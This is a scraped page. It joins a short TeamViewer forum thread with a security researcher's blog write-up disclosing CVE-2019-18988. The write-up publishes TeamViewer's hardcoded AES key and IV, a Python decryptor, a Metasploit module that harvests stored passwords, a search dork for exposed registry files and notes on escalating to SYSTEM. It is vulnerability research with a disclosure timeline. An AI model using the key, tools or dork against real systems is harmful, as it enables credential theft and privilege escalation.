* [![whitefish](https://w4.vanillicon.com/v2/407a5b3f3b665445913c2b9ee6bb8fc8.svg)](https://community.teamviewer.com/English/profile/whitefish "whitefish")
  [whitefish](https://community.teamviewer.com/English/profile/whitefish)

  Posts: **2**

  [February 2020](/English/discussion/comment/82201/#Comment_82201)

  It appears there is a new hack.      This blog report was created Feb, 2, 2020 posted Feb. 3rd (yesterday).     The hacker was using Teamviewer 7 and 14 ( no word on version 15 ).

  Is there a newly found vulnerability?

  <https://whynotsecurity.com/blog/teamviewer/>

  0
* [![JoshP](https://us.v-cdn.net/6032394/uploads/userpics/XA8CB85VZFPB/nIBV79W0L81K6.png)](https://community.teamviewer.com/English/profile/JoshP "JoshP")
  [JoshP](https://community.teamviewer.com/English/profile/JoshP)

  Posts: **905** **Senior Moderator** ☑

  [February 2020](/English/discussion/comment/82279/#Comment_82279)

  Hello [@whitefish](https://community.teamviewer.com/t5/user/viewprofilepage/user-id/420774) [@C0ntr07](https://community.teamviewer.com/t5/user/viewprofilepage/user-id/420685) [@QuillOmega0](https://community.teamviewer.com/t5/user/viewprofilepage/user-id/420644) [@JulioRossini](https://community.teamviewer.com/t5/user/viewprofilepage/user-id/420614)

  Thank you all for your feedback.

  We have posted a more in-depth explanation of the findings [here](https://community.teamviewer.com/t5/Announcements/Specification-on-CVE-2019-18988/td-p/82264).

  Josh P.

  Senior Community Moderator

  ---

  0

[Trustpilot](https://uk.trustpilot.com/review/www.teamviewer.com)

#### Categories

* [All Categories](/English/categories)
* [28.4K TeamViewer Remote](https://community.teamviewer.com/English/categories/teamviewer-en)
* [192 TeamViewer Tensor](https://community.teamviewer.com/English/categories/teamviewer-tensor)
* [11 TeamViewer Frontline](https://community.teamviewer.com/English/categories/frontline)
* [339 Remote Management](https://community.teamviewer.com/English/categories/itbrain)
* [700 Other products](https://community.teamviewer.com/English/categories/other-products)
* [123 Announcements](https://community.teamviewer.com/English/categories/announcements)
* [1K Changelogs](https://community.teamviewer.com/English/categories/change-logs)
* [159 Blog](https://community.teamviewer.com/English/categories/community-blog-en)
* [11 About this Community](https://community.teamviewer.com/English/categories/welcome)

#### This Week's Leaders

* [63 Points ![](https://w3.vanillicon.com/v2/3fda4c1e004fa446d87bfa5d3dfef002.svg) Peter\_Fibæk](https://community.teamviewer.com/English/profile/Peter_Fib%C3%A6k)
* [40 Points ![](https://w3.vanillicon.com/v2/35c701c749f36859ac410091b2b2ec71.svg) jpducharme](https://community.teamviewer.com/English/profile/jpducharme)
* [30 Points ![](https://wd.vanillicon.com/v2/d244abb3b866bd30310696e038c87cf0.svg) norm1206](https://community.teamviewer.com/English/profile/norm1206)
* [25 Points ![](https://wa.vanillicon.com/v2/abac55d2ef0ffe9e82e835b70b0234d2.svg) stevejanko](https://community.teamviewer.com/English/profile/stevejanko)
* [20 Points ![](https://w4.vanillicon.com/v2/401921d5a0aa9223e95c9d592f5edf36.svg) mboursiquot](https://community.teamviewer.com/English/profile/mboursiquot)
* [20 Points ![](https://w6.vanillicon.com/v2/6eabef160752583c710006b93419a888.svg) Admin\_Douaud](https://community.teamviewer.com/English/profile/Admin_Douaud)
* [20 Points ![](https://w4.vanillicon.com/v2/473ec9e8a6e142ec59f89d334f965bcb.svg) tectom](https://community.teamviewer.com/English/profile/tectom)
* [20 Points ![](https://wd.vanillicon.com/v2/ded33bc938b9a0ea6d1a60cf93ad6445.svg) ehtan](https://community.teamviewer.com/English/profile/ehtan)
* [20 Points ![](https://w5.vanillicon.com/v2/55d0d4be94ce1b28af16b4207af7e5c8.svg) atrain1111](https://community.teamviewer.com/English/profile/atrain1111)
* [15 Points ![](https://w4.vanillicon.com/v2/4a084e4a6988387695ff75e4a2b33298.svg) Eric6790](https://community.teamviewer.com/English/profile/Eric6790)

[![TeamViewer Logo](https://s7g10.scene7.com/is/content/teamviewergmbh/TeamViewer-Logo-light-1?dpr=off)](https://www.teamviewer.com/)

[![Facebook](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_FACEBOOK-3?dpr=off "Facebook")](https://www.facebook.com/teamviewer/)

[![LinkedIn](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_LINKEDIN-2?dpr=off "LinkedIn")](https://www.linkedin.com/company/teamviewer/)

[![Twitter](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_TWITTER-2?dpr=off "Twitter")](https://twitter.com/teamviewer)

[![Youtube](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_YOUTUBE-2?dpr=off "Youtube")](https://www.youtube.com/user/TeamViewer)

[![Instagram](https://s7g10.scene7.com/is/content/teamviewergmbh/TMV_Icon_RGB_White_INSTAGRAM-2?dpr=off "Instagram")](https://www.instagram.com/teamviewer/)

* [Privacy & Cookies](https://www.teamviewer.com/en/footer-pages/privacy-and-cookies/)
* [Contact](https://www.teamviewer.com/en/footer-pages/contact/)
* [EULA / DPA](https://www.teamviewer.com/en/footer-pages/eula-and-dpa/)
* [Product Description](https://www.teamviewer.com/en/footer-pages/product-description/)
* [Imprint](https://www.teamviewer.com/en/footer-pages/imprint/)



=== Content from whynotsecurity.com_1847755a_20250121_011112.html ===


* [Skip to primary navigation](#site-nav)
* [Skip to content](#main)
* [Skip to footer](#footer)

[WhyNotSecurity](/)

* [Posts](/posts/)
* [Categories](/categories/)
* [Tags](/tags/)
* [About](/about/)

Toggle search

Toggle menu

### [whynotsecurity](https://whynotsecurity.com/)

Why Not Security?

Follow

* [Twitter](https://twitter.com/whynotsecurity)
* [GitHub](https://github.com/whynotsecurity)

# [TeamViewer](https://whynotsecurity.com/blog/teamviewer/)

12 minute read

Oh man where to even begin with this one. This was a crazy ride and I learned a ton along the way.

TL;DR: TeamViewer stored user passwords encrypted with AES-128-CBC with they key of `0602000000a400005253413100040000` and iv of `0100010067244F436E6762F25EA8D704` in the Windows registry. If the password is reused anywhere, privilege escalation is possible. If you do not have RDP rights to machine but TeamViewer is installed, you can use TeamViewer to remote in. TeamViewer also lets you copy data or schedule tasks to run through their Service, which runs as `NT AUTHORITY\SYSTEM`, so a low privilege user can immediately go to `SYSTEM` with a `.bat` file. This was assigned CVE-2019-18988.

I was on-site at a client and these guys were good. They fixed absolutely everything from the report last year. They were unaware of mimt6 and that’s how we started getting some hashes rolling in. After finally cracking one we quickly found out this place was very locked down. Even the network admin did not have local admin on any windows machines nor did they have RDP rights anywhere either. We were able to find a few open shares and connect to them. We came across a backup of TeamViewer registry keys. I noted in the backup there were things like `OptionsPasswordAES` or `SecurityPasswordAES`. I quickly looked up to see what I could do with this and I found out it’s not much. I could however import the registry settings or deploy them in a .msi so all the TeamViewer installs in the organization can have the same password. This lead me to believe there was a shared key across all TeamViewer which would backup the claim by the reg keys there is AES involved. In the end we were unable to compromise the client in time but the TeamViewer registry keys really stuck with me and thus begins this rabbit hole.

The first thing I did was try to find the installer for the exact same version from the TeamViewer registry keys which happened to be version 7. A quick google search shows TeamViewer kindly offers all old version for download still which can be found [here](https://www.teamviewer.com/en/download/old-versions.aspx#version7). I setup a new Windows 10 VM and installed TeamViewer 7 on it. I played around with the settings and menus for a while. I imported the registry keys and was promptly locked out of the menu to change the options. It turns out the `OptionsPasswordAES` reg key is meant to keep unauthorized people out of the menu where you can change settings. I of course did not know the password and on a whim I downloaded [BulletPassView from nirsoft](https://www.nirsoft.net/utils/bullets_password_view.html) and ran that. Surprisingly, it gave me back a password in plaintext. Excellent, now I can get back into the Options page and look at the Security part of the menu. I was hoping the predefined Unattended Access Password would show up in BulletPassView as well. It only showed up as asterisks. On the plane ride home from the client, I watched [LiveOverflow’s video on Windows Game Hacking](https://www.youtube.com/watch?v=Pst-4NwY2is) and how you can search through memory with Cheat Engine. So I download Cheat Engine to the VM and searched for the password I found earlier. There was one hit! I browsed that memory region and looked around. I discovered the Options Password is stored in cleartext in memory between the bytes `080088` and `000000000000`. I kept looking around and then I found between `090088` and `000000000000` and this gave me the two different passwords for which I was looking! I decided to see how many people have poked at TeamViewer in the past and it turns out the clear text credentials in memory has already been found and assigned [CVE-2018-14333](https://www.cvedetails.com/cve/CVE-2018-14333/). As it turns out there was a report on APT41 talking about how they attacked TeamViewer users or used TeamViewer to gain remote access to some users. The tweets were deleted but they can be seen [here](http://archive.ph/PDuu2) (Shout-out to the Internet Archive project and archive.is/archive.today).

After talking with some coworkers about looking for the key to decrypt future client passwords, [@knavesec](https://twitter.com/knavesec) asked if my VM was connected to the internet. I said yes and then realized I need to test if the VM is downloading the AES key or if it is stored in the binary itself. I spun up a new Windows 10 VM, set the network to Host-Only mode, and copied the installer for TeamViewer over a HTTP server running on my host machine. I was in fact still able to see the passwords in plaintext. Now I needed to fire up IDA Pro and start reversing the massive binary that is TeamViewer. I spent weeks on this part. It got to the point I could tell if IDA was going to crash based on if it detected x-refs to a certain string in the binary. I was dumping memory in random places and running through each chunk of 32-bytes of memory at a time to see if I could luck onto the key. I was not able to and I chalked it up to using Python for the AES decryption and I noted there was the string `Rijndael` in TeamViewer so maybe they were using actual rijndael and not AES. I found out TeamViewer used [Crypto++](https://en.wikipedia.org/wiki/Crypto%2B%2B) for it’s encryption/decryption. As it turns out one of the supported modes in libcrypto++ was rijndael. I thought I was finally onto something. I used [API Monitor](http://www.rohitab.com/apimonitor) to step through TeamViewer and Cheat Engine to search for the passwords and once they popped up in memory, I dump the processes memory using [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) and then ran through every single 32-byte chunk of memory as the key sliding by one byte at a time to ensure I hit every possible combination. Since I was now using C++ instead of python to do this, it went fairly quickly. However, it gave me nothing. (Spoiler alert: it may have but I was searching for the wrong thing.). I thought maybe procdump was compressing something so I learned how to dump memory using [Frida](https://www.frida.re/) and I ran through every possibility there as well, again with no luck. I decided to go back to reversing the binary.

I spent so long digging through the binary I knew there had to be a better way. I kept researching and researching and it turns out there is a large amount of people that want to find the assets AES keys for Unity games. This lead me to a [blog post](https://blog.jamie.holdings/2019/03/23/reverse-engineering-aes-keys-from-unreal-engine-4-projects/) where I realized I was over thinking this and need to just use a debugger. After single stepping through TeamViewer for about 6 hours because I did not want to miss anything, I landed on the area of code that was responsible for the AES decryption. Here is a snippet from my notes.

```
=================================================
"ServerPasswordAES"=hex:88,44,d7,0a,b2,96,2a,3d,63,16,3c,ff,e4,15,04,fb
=================================================
Takes 8844d70ab2962a3d63163cffe41504fb into xmm0
Takes 5B659253E5E873D26723B7D5EAC06E3B into xmm1
pxor xmm0, xmm1
movdqa xmmword ptr ds:[eax],xmm0
[eax] = D3214559577E59EF04358B2A0ED56AC0

movdqa xmm1,xmmword ptr ds:[esi]     | [esi] = 25C8C8BD4298BB32A57EECBDBD045BBB
movdqa xmm0,xmmword ptr ds:[eax]     | [eax] = D3214559577E59EF04358B2A0ED56AC0
aesdec xmm0,xmm1                     | One round of an AES decryption, using Equivalent Inverse Cipher, 128-bit data (state) from xmm1 with 128-bit round key from xmm2/m128; store the result in xmm1.
movdqa xmmword ptr ds:[eax],xmm0     | [eax] = 6F AA 98 76 DE 11 7D 8D 7E B6 EE 61 2D 3D 15 52
movdqa xmm1,xmmword ptr ds:[esi+10]  | [esi+10]=[008FDE10]=79 DC 78 A6 67 50 73 8F E7 E6 57 8F 18 7A B7 06
add esi,20                           |
dec ecx                              | ecx = 3
aesdec xmm0,xmm1                     | do the actual decryption
movdqa xmmword ptr ds:[eax],xmm0     | [eax]=[008FDC90]=E3 58 26 46 A7 37 12 40 85 1C C0 43 7D 1F 1E 30

Three more rounds of aesdec then
aesdeclast xmm0, xmm1 .| Last round of AES decryption, using Equivalent Inverse Cipher, 128-bit data (state) from xmm2 with a 128-bit round key from xmm3/m128; store the result in xmm1.

008FDC90  01 00 01 00 67 24 4F 43 6E 67 62 F2 5E A8 D7 04  ....g$OCngbò^¨×.

```

This portion of code takes the bytes from the registry for `ServerPasswordAES` and then decrypts it with what appeared to be the key of `25C8C8BD4298BB32A57EECBDBD045BBB` this is actually incorrect. I asked a wizard [@ecdhe](https://github.com/ecdhe) what they knew about implementations of AES in assembly and they responded too quickly saying “the IV is supposed to be XOR’d with the first 128bits of the plaintext only after the `aesdec`”. I realized I missed the `movdqa` into `xmm2` and the `pxor xmm0,xmm1` was not further obfuscation but rather the IV being used. I set a breakpoint to the beginning of the function and restarted the process. The mov into xmm2 was they key of `0602000000a400005253413100040000`. The IV is the decrypted bytes of `ServerPasswordAES` with the previously mentioned key and a null IV. In this case, the IV for `SecurityPasswordAES` was `0100010067244F436E6762F25EA8D704`. This works for TeamViewer Version 7 out of the box and on the latest version of Teamviewer 14 as long as the `SecurityPasswordExported` key is available. At the time of writing, I have not confirmed if it works on `PermanentPassword` which appears to be the Unattended Access Password for TeamViewer 14.

In TeamViewer 14, they introduced a scripting engine for their business customers. Shown below is the output of `sc.exe qc TeamViewer7`.

```
PS C:\Users\Administrator\Documents\testing> sc.exe qc TeamViewer7
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: TeamViewer7
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : TeamViewer 7
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

```

Notice the last line in the output from `tasklist /v`. By having the password to a TeamViewer installation and the scripting engine enabled, you can escalate from a low privilege user to `NT AUTHORITY\SYSTEM` by only reading the registry.

```
PS C:\Users\Administrator\Documents\testing> tasklist /v

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title
========================= ======== ================ =========== ============ =============== ================================================== ============ ============================================
System Idle Process              0 Services                   0          4 K Unknown         NT AUTHORITY\SYSTEM                                    69:20:56 N/A
System                           4 Services                   0        144 K Unknown         N/A                                                     0:01:43 N/A
smss.exe                       260 Services                   0      1,264 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
csrss.exe                      376 Services                   0      4,300 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:05 N/A
wininit.exe                    444 Services                   0      5,172 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:02 N/A
csrss.exe                      452 Console                    1      4,332 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
winlogon.exe                   504 Console                    1      8,364 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
services.exe                   568 Services                   0      7,368 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:04 N/A
lsass.exe                      576 Services                   0     21,076 K Unknown         NT AUTHORITY\SYSTEM                                     0:05:14 N/A
svchost.exe                    660 Services                   0     20,084 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:01 N/A
svchost.exe                    712 Services                   0     11,604 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:21 N/A
LogonUI.exe                    812 Console                    1     42,972 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
dwm.exe                        820 Console                    1     30,396 K Unknown         Window Manager\DWM-1                                    0:00:00 N/A
svchost.exe                    912 Services                   0     78,452 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:07:20 N/A
svchost.exe                    948 Services                   0     27,564 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:18 N/A
svchost.exe                    956 Services                   0     19,964 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:03 N/A
svchost.exe                    396 Services                   0     17,756 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:01 N/A
svchost.exe                    440 Services                   0      9,608 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:35 N/A
svchost.exe                   1060 Services                   0     68,988 K Unknown         NT AUTHORITY\SYSTEM                                     0:04:04 N/A
svchost.exe                   1072 Services                   0     27,036 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:02 N/A
VSSVC.exe                     1188 Services                   0      7,772 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
svchost.exe                   1256 Services                   0     23,948 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:33 N/A
svchost.exe                   1268 Services                   0      7,040 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A
spoolsv.exe                   1952 Services                   0     24,168 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:05 N/A
svchost.exe                   2032 Services                   0     31,012 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:04 N/A
IpOverUsbSvc.exe              1172 Services                   0     15,688 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
SolidCP.VmConfig.exe          1580 Services                   0     36,636 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:05 N/A
TeamViewer_Service.exe        1908 Services                   0     14,908 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:01 N/A

```

Since you stuck around this long, here is a Google dork to find some TeamViewer registry keys. Yes, you can decrypt them.
`"SecurityPasswordAES" OR "OptionsPasswordAES" OR "SecurityPasswordExported" OR "PermanentPassword" filetype:reg`

Timeline:

November 05th, 2019: Reach out to @TeamViewer\_help on Twitter

November 05th, 2019: Send email to the Director of Security

November 14th, 2019: Request CVE based on precedent set by CVE-2014-1812

November 15th, 2019: Receive CVE-2019-18988

November 15th, 2019: Send email to Director of Security notifying them there is now a CVE assigned to this

November 18th, 2019: Receive first and only email back from vendor “We’re looking into it” email

January 13th, 2020: Status update request email sent to Director of Security

February 03rd, 2020: Publish writeup

See below for an implementation in Python as well as further below for a post metasploit module

```
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher = "d690a9d0a592327f99bb4c6a6b6d4cbe"			# output from the registry

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)

```

```
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Windows Gather TeamViewer Passwords',
        'Description'   => %q{ This module will find and decrypt stored TeamViewer keys },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Nic Losby <blurbdust[at]gmail.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  def app_list
    results = ""
    keys = [
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version8", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version9", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version10", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version11", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version12", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version13", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version14", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version15", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer", "Version" ],
      [ "HKLM\\SOFTWARE\\TeamViewer\\Temp", "SecurityPasswordExported" ],
      [ "HKLM\\SOFTWARE\\TeamViewer", "Version" ],
    ]

    keys.each do |keyx86|

      #parent key
      p = keyx86[0,1].join

      #child key
      c = keyx86[1,1].join

      key      = nil
      keychunk = registry_getvaldata(p, c)
      key      = keychunk.unpack("C*") if not keychunk.nil?

      optpass  = registry_getvaldata(p, "OptionsPasswordAES")
      secpass  = registry_getvaldata(p, "SecurityPasswordAES")
      secpasse = registry_getvaldata(p, "SecurityPasswordExported")
      servpass = registry_getvaldata(p, "ServerPasswordAES")
      proxpass = registry_getvaldata(p, "ProxyPasswordAES")
      license  = registry_getvaldata(p, "LicenseKeyAES")

      if not optpass.nil?
        decvalue = decrypt(optpass)
        if not decvalue.nil?
          print_good("Found Options Password: #{decvalue}")
          results << "Options:#{decvalue}\n"
        end
      end
      if not secpass.nil?
        decvalue = decrypt(secpass)
        if not decvalue.nil?
          print_good("Found Security Password: #{decvalue}")
          results << "Security:#{decvalue}\n"
        end
      end
      if not secpasse.nil?
        decvalue = decrypt(secpasse)
        if not decvalue.nil?
          print_good("Found Security Password Exported: #{decvalue}")
          results << "SecurityE:#{decvalue}\n"
        end
      end
      if not servpass.nil?
        decvalue = decrypt(servpass)
        if not decvalue.nil?
          print_good("Found Server Password: #{decvalue}")
          results << "Server:#{decvalue}\n"
        end
      end
      if not proxpass.nil?
        decvalue = decrypt(proxpass)
        if not decvalue.nil?
          print_good("Found Proxy Password: #{decvalue}")
          results << "Proxy:#{decvalue}\n"
        end
      end
      if not license.nil?
        decvalue = decrypt(license)
        if not decvalue.nil?
          print_good("Found License Key: #{decvalue}")
          results << "License:#{decvalue}\n"
        end
      end
    end

    #Only save data to disk when there's something in the table
    if not results.empty?
      path = store_loot("host.teamviewer_passwords", "text/plain", session, results, "teamviewer_passwords.txt", "TeamViewer Passwords")
      print_good("Passwords stored in: #{path.to_s}")
    end
  end

  def decrypt(encrypted_data)
    password = ""
    return password unless encrypted_data

    password = ""
    original_data = encrypted_data.dup

    decoded = encrypted_data
    #print_status(decoded)

    key = "\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
    iv  = "\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
    aes = OpenSSL::Cipher.new("AES-128-CBC")
    begin
      aes.decrypt
      aes.key = key
      aes.iv = iv
      plaintext = aes.update(decoded)
      password = Rex::Text.to_ascii(plaintext, 'utf-16le')
      if plaintext.empty?
        return nil
      end
    rescue OpenSSL::Cipher::CipherError => e
      puts "Unable to decode: \"#{encrypted_data}\" Exception: #{e}"
    end

    password
  end

  def run
    print_status("Finding TeamViewer Passwords on #{sysinfo['Computer']}")
    app_list
  end
end

```

 **Tags:**
[blog](/tags/#blog),
[blurbdust](/tags/#blurbdust)

 **Categories:**
[blog](/categories/#blog)

 **Updated:** February 2, 2020

[Previous](/blog/coming-soon/ "WhyNotSecurity
")
[Next](/blog/max/ "Max
")

## You May Also Enjoy

## [Credmaster2](/blog/credmaster2/)

8 minute read

CredMaster 2: Electric Boogaloo

## [Office365 User Enumeration](/blog/o365fedenum/)

3 minute read

Office365 User Enumeration Through Correlated Response Analysis

## [Convert ldapdomaindump to Bloodhound](/blog/ldd2bh/)

1 minute read

Convert ldapdomaindump to Bloodhound using ldd2bh

## [A tool to find Windows registry files in a blob of data](/blog/needle/)

4 minute read

A tool to find Windows registry files in a blob of data: Needle

Enter your search term...

* [Twitter](https://twitter.com/whynotsecurity)
* [GitHub](https://github.com/whynotsecurity)
* [Feed](/feed.xml)

© 2023 WhyNotSecurity. Powered by [Jekyll](https://jekyllrb.com) & [Minimal Mistakes](https://mademistakes.com/work/minimal-mistakes-jekyll-theme/).



=== Content from community.teamviewer.com_d77502ee_20250121_031851.html ===
You need to enable JavaScript to run this app.
